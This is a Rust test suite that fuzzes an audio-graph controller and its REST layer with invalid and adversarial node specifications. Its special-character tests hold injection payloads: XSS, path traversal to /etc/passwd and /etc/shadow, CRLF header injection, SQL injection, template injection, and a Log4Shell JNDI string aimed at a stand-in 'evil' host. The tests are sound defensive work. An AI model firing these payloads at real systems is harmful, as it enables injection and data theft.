//! Sanitizer i3 — input validation and injection defence.
//!
//! Verifies that invalid or adversarial `NodeSpec` inputs are rejected
//! gracefully (no panics, no unwraps that could crash) and that the
//! controller / REST layer returns appropriate errors.

use control_api::{ControlApi, NodeSpec};
use proptest::prelude::*;

// ---------------------------------------------------------------------------
// Helper: build a controller backed by an in-memory store.
// ---------------------------------------------------------------------------

mod support {
    use audio_graph_bsd::TopologyEvent;
    use session_store::{Mutation, MutationId, SessionStore, TopologySnapshot};
    use std::sync::atomic::{AtomicU64, Ordering};
    use std::sync::{Arc, Mutex};

    pub struct InMemoryStore {
        topology: Mutex<TopologySnapshot>,
        next_mid: AtomicU64,
    }

    impl InMemoryStore {
        pub fn new() -> Self {
            Self {
                topology: Mutex::new(TopologySnapshot::new()),
                next_mid: AtomicU64::new(1),
            }
        }
    }

    impl Default for InMemoryStore {
        fn default() -> Self {
            Self::new()
        }
    }

    impl SessionStore for InMemoryStore {
        fn get_topology(&self) -> TopologySnapshot {
            self.topology.lock().expect("lock").clone()
        }

        fn apply_mutation(&self, mutation: Mutation) -> session_store::Result<MutationId> {
            let mid = self.next_mid.fetch_add(1, Ordering::SeqCst);
            self.topology.lock().expect("lock").apply(&mutation);
            Ok(mid)
        }

        fn subscribe(&self) -> tokio::sync::broadcast::Receiver<TopologyEvent> {
            let (tx, _) = tokio::sync::broadcast::channel(1);
            tx.subscribe()
        }
    }

    pub fn make_ctrl() -> control_api::GraphController {
        control_api::GraphController::new(Arc::new(InMemoryStore::new()))
    }
}

use support::make_ctrl;

// ---------------------------------------------------------------------------
// Empty / whitespace-only labels
// ---------------------------------------------------------------------------

#[test]
fn empty_string_label_rejected() {
    let ctrl = make_ctrl();
    let err = ctrl
        .create_node(NodeSpec {
            label: "".into(),
            inputs: 1,
            outputs: 1,
            kind: None,
            params: None,
        })
        .unwrap_err();
    assert!(
        matches!(err, control_api::ControlError::BadRequest(_)),
        "expected BadRequest, got {err:?}"
    );
}

#[test]
fn whitespace_only_label_rejected() {
    let ctrl = make_ctrl();
    for label in ["   ", "\t", "\n", " \t \n "] {
        let err = ctrl
            .create_node(NodeSpec {
                label: label.into(),
                inputs: 1,
                outputs: 1,
                kind: None,
                params: None,
            })
            .unwrap_err();
        assert!(
            matches!(err, control_api::ControlError::BadRequest(_)),
            "label {label:?} should be rejected"
        );
    }
}

// ---------------------------------------------------------------------------
// Oversized strings
// ---------------------------------------------------------------------------

#[test]
fn very_long_label_rejected_or_accepted_gracefully() {
    let ctrl = make_ctrl();
    let label = "x".repeat(100_000);
    // The controller only checks `trim().is_empty()` — a long non-empty label
    // is accepted. The test verifies no panic / OOM.
    let _ = ctrl.create_node(NodeSpec {
        label,
        inputs: 1,
        outputs: 1,
        kind: None,
        params: None,
    });
}

#[test]
fn very_long_kind_rejected_or_accepted_gracefully() {
    let ctrl = make_ctrl();
    let kind = "k".repeat(1_000_000);
    let _ = ctrl.create_node(NodeSpec {
        label: "ok".into(),
        inputs: 1,
        outputs: 1,
        kind: Some(kind),
        params: None,
    });
}

// ---------------------------------------------------------------------------
// Special characters in label / kind
// ---------------------------------------------------------------------------

#[test]
fn special_characters_in_label_no_panic() {
    let ctrl = make_ctrl();
    let malicious_labels = [
        "<script>alert(1)</script>",
        "\\0\\0\\0",
        "../../../etc/passwd",
        "\u{0000}null\u{0000}",
        "🎉🔥💀",
        "label\r\nInjection: admin=true",
        "' OR 1=1 --",
        "{{constructor.constructor('return this')()}}",
    ];
    for label in malicious_labels {
        let result = ctrl.create_node(NodeSpec {
            label: label.into(),
            inputs: 1,
            outputs: 1,
            kind: None,
            params: None,
        });
        // Must not panic; accept or reject is fine.
        let _ = result;
    }
}

#[test]
fn special_characters_in_kind_no_panic() {
    let ctrl = make_ctrl();
    let malicious_kinds = [
        "<img src=x onerror=alert(1)>",
        "${jndi:ldap://evil/a}",
        "\\x00\\x01\\xff",
        "../../../etc/shadow",
        "kind\r\nextra-header: evil",
    ];
    for kind in malicious_kinds {
        let result = ctrl.create_node(NodeSpec {
            label: "safe".into(),
            inputs: 1,
            outputs: 1,
            kind: Some(kind.into()),
            params: None,
        });
        let _ = result;
    }
}

// ---------------------------------------------------------------------------
// Extreme numeric values
// ---------------------------------------------------------------------------

#[test]
fn zero_inputs_zero_outputs_accepted() {
    let ctrl = make_ctrl();
    let id = ctrl
        .create_node(NodeSpec {
            label: "passthrough".into(),
            inputs: 0,
            outputs: 0,
            kind: None,
            params: None,
        })
        .unwrap();
    let info = &ctrl.list_nodes()[0];
    assert_eq!(info.id, id);
    assert_eq!(info.inputs, 0);
    assert_eq!(info.outputs, 0);
}

#[test]
fn large_port_count_no_panic() {
    let ctrl = make_ctrl();
    let result = ctrl.create_node(NodeSpec {
        label: "big".into(),
        inputs: u16::MAX,
        outputs: u16::MAX,
        kind: None,
        params: None,
    });
    // May succeed (store allocates the ports) or fail — must not panic.
    let _ = result;
}

// ---------------------------------------------------------------------------
// Node operations on nonexistent ids
// ---------------------------------------------------------------------------

#[test]
fn delete_nonexistent_node_returns_not_found() {
    let ctrl = make_ctrl();
    let err = ctrl.delete_node(999).unwrap_err();
    assert!(matches!(err, control_api::ControlError::NotFound(_)));
}

#[test]
fn delete_nonexistent_link_returns_not_found() {
    let ctrl = make_ctrl();
    let err = ctrl.delete_link(0).unwrap_err();
    assert!(matches!(err, control_api::ControlError::NotFound(_)));
}

#[test]
fn link_nonexistent_nodes_does_not_panic() {
    let ctrl = make_ctrl();
    // link() does not validate node existence — it applies the mutation
    // directly. The test verifies no panic occurs.
    let _ = ctrl.link(100, 200);
}

// ---------------------------------------------------------------------------
// Malformed JSON (via serde deserialization)
// ---------------------------------------------------------------------------

#[test]
fn deserialize_empty_json_object_fails() {
    let result: Result<NodeSpec, _> = serde_json::from_str("{}");
    assert!(
        result.is_err(),
        "empty object should fail (missing required fields)"
    );
}

#[test]
fn deserialize_wrong_types_fails() {
    let result: Result<NodeSpec, _> =
        serde_json::from_str(r#"{"label":123,"inputs":"abc","outputs":true}"#);
    assert!(result.is_err(), "wrong types should fail deserialization");
}

#[test]
fn deserialize_nested_json_fails() {
    let result: Result<NodeSpec, _> =
        serde_json::from_str(r#"{"label":{"nested":"value"},"inputs":1,"outputs":1}"#);
    assert!(result.is_err(), "nested object for label should fail");
}

#[test]
fn deserialize_truncated_json_fails() {
    let result: Result<NodeSpec, _> = serde_json::from_str(r#"{"label":"ok","in"#);
    assert!(result.is_err(), "truncated JSON should fail");
}

#[test]
fn deserialize_array_instead_of_object_fails() {
    let result: Result<NodeSpec, _> = serde_json::from_str(r#"[1,2,3]"#);
    assert!(result.is_err(), "array should fail");
}

#[test]
fn deserialize_null_label_fails() {
    let result: Result<NodeSpec, _> =
        serde_json::from_str(r#"{"label":null,"inputs":1,"outputs":1}"#);
    assert!(result.is_err(), "null label should fail");
}

// ---------------------------------------------------------------------------
// REST-layer malformed bodies (integration with axum)
// ---------------------------------------------------------------------------

#[test]
fn rest_invalid_json_body_returns_error() {
    use axum::body::Body;
    use axum::http::{Request, StatusCode};
    use tower::ServiceExt;

    // Build a minimal router that rejects bad JSON.
    let ctrl = std::sync::Arc::new(make_ctrl());
    let app = axum::Router::new()
        .route(
            "/nodes",
            axum::routing::post(
                |axum::extract::State(ctrl): axum::extract::State<
                    std::sync::Arc<control_api::GraphController>,
                >,
                 axum::Json(spec): axum::Json<NodeSpec>| async move {
                    ctrl.create_node(spec)
                        .map(|id| {
                            (
                                StatusCode::CREATED,
                                axum::Json(control_api::CreateNodeResponse { id }),
                            )
                        })
                        .map_err(|_| StatusCode::BAD_REQUEST)
                },
            ),
        )
        .with_state(ctrl);

    let body = r#"{"label": "ok", "inputs": }"#;
    let req = Request::builder()
        .method("POST")
        .uri("/nodes")
        .header("content-type", "application/json")
        .body(Body::from(body.to_owned()))
        .unwrap();
    let rt = tokio::runtime::Runtime::new().unwrap();
    let resp = rt.block_on(app.oneshot(req)).unwrap();
    assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
}

// ---------------------------------------------------------------------------
// Proptest: arbitrary valid NodeSpec is always accepted
// ---------------------------------------------------------------------------

proptest! {
    #[test]
    fn valid_nodespec_accepted(
        label in "[a-zA-Z0-9_-]{1,64}",
        inputs in 0u16..100,
        outputs in 0u16..100,
    ) {
        let ctrl = make_ctrl();
        let id = ctrl.create_node(NodeSpec {
            label,
            inputs,
            outputs,
            kind: None,
                params: None,
        }).expect("valid spec must be accepted");
        prop_assert!(id > 0);
    }

    #[test]
    fn valid_nodespec_with_kind_accepted(
        label in "[a-zA-Z0-9_-]{1,64}",
        kind in "[a-zA-Z0-9_-]{1,32}",
        inputs in 0u16..100,
        outputs in 0u16..100,
    ) {
        let ctrl = make_ctrl();
        let _id = ctrl.create_node(NodeSpec {
            label,
            kind: Some(kind.clone()),
            inputs,
            outputs,
            params: None,
        }).expect("valid spec with kind must be accepted");
        let info = &ctrl.list_nodes()[0];
        prop_assert_eq!(info.kind.as_deref(), Some(kind.as_str()));
    }
}
